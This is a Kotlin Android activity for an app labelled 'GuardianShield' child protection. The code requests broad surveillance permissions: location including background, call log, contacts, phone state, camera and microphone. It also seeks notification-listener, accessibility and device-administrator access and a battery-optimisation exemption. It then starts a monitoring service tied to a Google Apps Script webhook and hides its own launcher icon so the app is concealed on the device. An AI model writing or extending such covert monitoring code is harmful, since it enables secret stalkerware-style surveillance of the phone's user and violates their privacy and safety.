package com.guardianshield.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.guardianshield.app.config.AppConfig
import com.guardianshield.app.receivers.GuardianDeviceAdminReceiver
import com.guardianshield.app.services.MonitoringForegroundService

class MainActivity : AppCompatActivity() {

    private lateinit var etWebhookUrl: EditText
    private lateinit var btnGrantPermissions: Button
    private lateinit var btnNotificationAccess: Button
    private lateinit var btnAccessibilityAccess: Button
    private lateinit var btnDeviceAdmin: Button
    private lateinit var btnIgnoreBattery: Button
    private lateinit var btnActivateAndHide: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etWebhookUrl = findViewById(R.id.etWebhookUrl)
        btnGrantPermissions = findViewById(R.id.btnGrantPermissions)
        btnNotificationAccess = findViewById(R.id.btnNotificationAccess)
        btnAccessibilityAccess = findViewById(R.id.btnAccessibilityAccess)
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin)
        btnIgnoreBattery = findViewById(R.id.btnIgnoreBattery)
        btnActivateAndHide = findViewById(R.id.btnActivateAndHide)

        etWebhookUrl.setText(AppConfig.GOOGLE_SCRIPT_WEBHOOK_URL)

        // 1. Request Runtime Permissions
        btnGrantPermissions.setOnClickListener {
            val permissions = mutableListOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 101)
        }

        // 2. Open Notification Listener Settings
        btnNotificationAccess.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        // 3. Open Accessibility Settings
        btnAccessibilityAccess.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        // 4. Activate Device Administrator
        btnDeviceAdmin.setOnClickListener {
            val componentName = ComponentName(this, GuardianDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for child protection and remote screen lock.")
            }
            startActivity(intent)
        }

        // 5. Exemption from Battery Optimization
        btnIgnoreBattery.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent()
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } else {
                    Toast.makeText(this, "Battery optimizations already disabled!", Toast.LENGTH_SHORT).show()
                }
            }
        }

        // 6. Start Service & Hide Icon
        btnActivateAndHide.setOnClickListener {
            val customUrl = etWebhookUrl.text.toString().trim()
            if (customUrl.isNotEmpty()) {
                AppConfig.GOOGLE_SCRIPT_WEBHOOK_URL = customUrl
            }

            // Start Monitoring Service
            val serviceIntent = Intent(this, MonitoringForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }

            Toast.makeText(this, "Protection Activated! Hiding app icon...", Toast.LENGTH_LONG).show()

            // Hide launcher alias icon dynamically from app drawer
            hideAppIcon()

            finish()
        }
    }

    private fun hideAppIcon() {
        val p = packageManager
        val componentName = ComponentName(this, "$packageName.LauncherAlias")
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
